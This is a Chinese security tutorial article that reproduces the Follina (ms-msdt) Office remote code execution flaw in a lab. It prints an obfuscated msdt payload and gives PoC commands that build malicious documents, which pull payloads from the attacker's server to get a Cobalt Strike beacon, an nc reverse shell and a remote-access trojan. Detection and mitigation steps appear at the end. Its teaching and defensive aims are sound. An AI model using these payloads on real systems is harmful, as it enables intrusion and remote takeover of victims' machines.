<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/0fD356HZa4R-PP1beMtknw)

获网安教程

免费 & 进群

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcphoiceCnjmUWFfEhzNhfgO7iaV9R1C73m3H1q8jd45xJl4GH5ARr4yJ5lqeZuyZ7kd8UEMy2RQJUOA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

  

本文由掌控安全学院 - zhang3 投稿

漏洞概述
----

该漏洞首次发现在 2022 年 5 月 27 日，由白俄罗斯的一个 IP 地址上传。恶意文档从 Word 远程模板功能从远程 Web 服务器检索 HTML 文件，通过 ms-msdt MSProtocol URI 方法来执行恶意 PowerShell 代码。感染过程利用 Windows 程序 msdt.exe，该程序用于运行各种 Windows 疑难解答程序包。此工具的恶意文档无需用户交互即可调用它。导致在宏被禁用的情况下，恶意文档依旧可以使用 `ms-msdt` URI 执行任意 PowerShell 代码。

影响版本
----

目前已知影响的版本为：

*   office 2021 Lts
    
*   office 2019
    
*   office 2016
    
*   Office 2013
    
*   Office ProPlus
    
*   Office 365
    

漏洞复现

#### 官方 payload

```
msdt.exe /id PCWDiagnostic /skip force /param "IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'Unicode.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'YwBhAGwAYwA='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe"

```

在 cmd 中运行即可弹出计算器：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSKH8VV3fhPpf8Z2BQO8cq5VYHJIZe3hzgEeIzDg0Ozo4QCmdo9kEWwg/640?wx_fmt=png)

#### 环境部署

office 下载地址：  
`https://otp.landian.vip/zh-cn/download.html`  
因为已经部署好了，简单截图说明一下：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSUQUZlVXBkplcHYDbAfBhskdLtmVvWoia0tqQtvZ5IibzHH0JlZpRn6SQ/640?wx_fmt=png)  
windows 环境用了：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSnlA5VfiaVWNFNaGKh8bBZEl2UWlQbUwiaVibYvdx6ufeEgWn1XsTq07bA/640?wx_fmt=png)

#### 环境说明：

攻击机 ip：192.168.84.205  
目标靶机 ip：192.168.84.185

#### 使用 poc1：

下载地址：  
`https://github.com/chvancooten/follina.py`  
在攻击机执行：  
`python3 .\follina.py -t docx -m binary -b \windows\system32\calc.exe -u 192.168.84.205`  
生成恶意 docx 文档：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSIpnIsar4VsHbjFgLp1gZufJS3Kgribjm75gUL9VFvGqv4KhS9rTpdnQ/640?wx_fmt=png)  
将 clickme.docx 放在靶机打开：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaS5gGd5zbG3X4NRbHpoHXCRkkdzAuz5QGOIKcibTdyVmvZ7ahWo4hnicxA/640?wx_fmt=png)  
这里远程加载恶意文件，生活中遇到这种情况可以警惕了。  
程序错误诊断，然后弹出计算器：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSjxOLwURAic5yuTRo8TmJrkd3GNTdYW1MGmkicAT6m0SK6ibWNsmbQmcqw/640?wx_fmt=png)

攻击机可以看到远程加载请求：  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSKGKcedR715yWrArCjBRMJiaI4zAXJX6BXmu58uLIXUqfJT546n0vc6w/640?wx_fmt=png)

复现成功。  
我们肯定不满足于弹出计算器，如何深度利用获取权限呢？

#### 使用 poc2

poc1 的命令执行没看懂。  
下载地址：  
`https://github.com/JohnHammond/msdt-follina`

#### CS 上线

在 cs 上生成木马，这个不用多说。  
创建 pocexe 文件夹，将 nc，cs 木马放进去，并在该目录下开启简单的 http.server 服务：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaS8JajCCJ5S873PODWqr3voW1EuCoiboazqBZOKU4hEIw1AT2DUVws36Q/640?wx_fmt=png)  
开启服务：  
`python -m http.server 8080`  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaS5MKqDy1kF6fiaOM9icAsnbULlXlm58cIU2ZUBibBAlXicnRXSygmoo723g/640?wx_fmt=png)  
改 poc（follina.py）文件下载路径：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSq6rdkruqS0aYk3jibyTUkZp1LgjykzibO7yAcZ4VfSbFvK8nuh3KYZpg/640?wx_fmt=png)生成恶意文档：  
`python follina.py -i 192.168.84.205 -p 8000 -r 5555 #-r为反弹shell的端口，这里暂时用不到`  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSXnNzll8QobQzzEeeBEAX6iaPv5JeiaeDP7JUcfNNj43dQJHJJFvncNlQ/640?wx_fmt=png)将生成的 follina.doc 放在靶机打开：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSHkMic98gpO1OjqGgdQv0PK0rOYicXGDcCiaWemxfgM6GbBvLwjGcYVIow/640?wx_fmt=png)看到 cs 上线：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaS7nZAcV79l7kAmlcGf2EhiatAWZelDjD9UTIkdmmEPqmOxteLKw9jRUA/640?wx_fmt=png)查看进程：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaS8OHcyEJ89JGt5l3ZCohJd7mhjrcXgTNTYouicH8csGu2GuzC39seGcg/640?wx_fmt=png)文件存在：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSEoU5hsDF9GFOF0vSt28HTFNV5cmHRHIROF1bp7Jxytnsj4sIRVRNJA/640?wx_fmt=png)  

#### nc 反弹 shell：

改 poc 配置：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSfvlHibwN6zHF98NvJ3AWfJriaR3tzI4tyGiciaTR7dKmSwUEju5Vctfv7A/640?wx_fmt=png)执行命令：  
`python follina.py -i 192.168.84.205 -p 8000 -r 5555 #这里用到了 -r 反弹shell`  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSTYQQOsxTAAohb1gkJniaYJNoo98hUibZqsghqdkibhoYjBl9vxkuyIS4w/640?wx_fmt=png)将生成得 doc 文档放在靶机执行：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSOR6Q9pb900y2s4G0OatnWOL8ZwKqU2ialgObAiaQsP4BuFjOYAOycSMw/640?wx_fmt=png)反弹 shell 成功：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSFoDl8libVpXibqVnJVFBdygYCyDVdSmHvYfgyYPTJia3EzOGVqfhozbSQ/640?wx_fmt=png)看到 nc 运行：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSBMNskiczbvCf4c0foF0VkkH1DwWqBjhUvOgeAvLa6aJxceeP8bwcxlw/640?wx_fmt=png)  

#### 大灰狼远控

用了 7.5 的版本，9.5 的版本在虚拟机运行报错，大半天都没解决。  
生成木马：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSz8EGGh8Y4zN5hDGbbH1exicpogQAhzZuuKY6V2ovv3ibIwlVkQnLWSdg/640?wx_fmt=png)

系统设置，配置监听端口：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSNI3ugClCrSGiaAxNmd4CcU2P0dabVsynexMrEzy5lpEnAdglS10VArQ/640?wx_fmt=png)  
然后与上面的两种方式一样，加载大灰狼木马  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSqWgu1upiazcLTpr9X07uw1vYD1txVC96uj22AIbQhQsf0IAia3FogdNA/640?wx_fmt=png)目标机运行：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSjAg37GjkFvem54qXfjyGN1ObaLXUQicymMT004rVvtlbdZ93HbXiaBiaA/640?wx_fmt=png)上线：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSkAmBNnnlYZuOm7Nll3xAxZZq7lvKxE6ZiczicZLox2JTkZcfGrI5icfxw/640?wx_fmt=png)免杀做好，还是比较强大的：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSPD96Ionfpv9KtzyveeDVpReRZFa1xHXwNBScsA4ochzxyvcAYDkiceA/640?wx_fmt=png)  

#### 简单分析

将 doc 文件后缀改为 zip：  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSeIRfcqkAHZaCx2cJcRibc9wx33eHmVKicW4RN7bgkGRYrlzwRqdsfHZw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSvBZwlQlDZiciabrCAdHSgpArs3cojQHaFst1s16RgoW4HnEfFpdyTzVQ/640?wx_fmt=png)

解压：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcoURaFhrRfBItuRm2O8ONiaSCIBfUMdeNondriaCJibGFZsic6Gtt6JChuD3czUoc5iaNAViaWkIdNo3Zpw/640?wx_fmt=png)  
可以根据这个 ip 溯源反制。  
检测的思路：

```
从cmd/msedge/office这些进程诞生的msdt.exe进程是可疑的。
msdt.exe里参数带有/../../xxxx/.exe，恶意payload。 直接检测这个也是可以的。

```

修复建议
----

以管理员身份运行命令提示符，执行以下两条命令：

```
reg export HKEY_CLASSES_ROOT\ms-msdt filename
reg delete HKEY_CLASSES_ROOT\ms-msdt /f

```

撤消解决方法：

```
reg import filename

```

总结
--

对大佬们的文章进行了资源整合。这里仅作线下学习，如有违法行为，与本人无关。

参考文章
----

https://blog.csdn.net/weixin_45329947/article/details/125089243  
https://www.cnblogs.com/bonelee/p/16337291.html

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)  

**没看够~？欢迎关注！**

**分享本文到朋友圈，可以凭截图找老师领取**

上千**教程 + 工具 + 交流群 + 靶场账号**哦

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcphoiceCnjmUWFfEhzNhfgO7iaV9R1C73m3H1q8jd45xJl4GH5ARr4yJ5lqeZuyZ7kd8UEMy2RQJUOA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

 **分享后扫码加我！**

  

**回顾往期内容**

[Xray 挂机刷漏洞](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247504665&idx=1&sn=eb88ca9711e95ee8851eb47959ff8a61&chksm=fa6baa68cd1c237e755037f35c6f74b3c09c92fd2373d9c07f98697ea723797b73009e872014&scene=21#wechat_redirect)  

[零基础学黑客，该怎么学？](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487576&idx=1&sn=3852f2221f6d1a492b94939f5f398034&chksm=fa686929cd1fe03fcb6d14a5a9d86c2ed750b3617bd55ad73134bd6d1397cc3ccf4a1b822bd4&scene=21#wechat_redirect)

[网络安全人员必考的几本证书！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247520349&idx=1&sn=41b1bcd357e4178ba478e164ae531626&chksm=fa6be92ccd1c603af2d9100348600db5ed5a2284e82fd2b370e00b1138731b3cac5f83a3a542&scene=21#wechat_redirect)  

[文库｜内网神器 cs4.0 使用说明书](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247519540&idx=1&sn=e8246a12895a32b4fc2909a0874faac2&chksm=fa6bf445cd1c7d53a207200289fe15a8518cd1eb0cc18535222ea01ac51c3e22706f63f20251&scene=21#wechat_redirect)  

[代码审计 | 这个 CNVD 证书拿的有点轻松](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503150&idx=1&sn=189d061e1f7c14812e491b6b7c49b202&chksm=fa6bb45fcd1c3d490cdfa59326801ecb383b1bf9586f51305ad5add9dec163e78af58a9874d2&scene=21#wechat_redirect)

[【精选】SRC 快速入门 + 上分小秘籍 + 实战指南](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247512593&idx=1&sn=24c8e51745added4f81aa1e337fc8a1a&chksm=fa6bcb60cd1c4276d9d21ebaa7cb4c0c8c562e54fe8742c87e62343c00a1283c9eb3ea1c67dc&scene=21#wechat_redirect)

 [代理池工具撰写 | 只有无尽的跳转，没有封禁的 IP！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503462&idx=1&sn=0b696f0cabab0a046385599a1683dfb2&chksm=fa6bb717cd1c3e01afc0d6126ea141bb9a39bf3b4123462528d37fb00f74ea525b83e948bc80&scene=21#wechat_redirect)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

点赞 + 在看支持一下吧~ 感谢看官老爷~ 

你的点赞是我更新的动力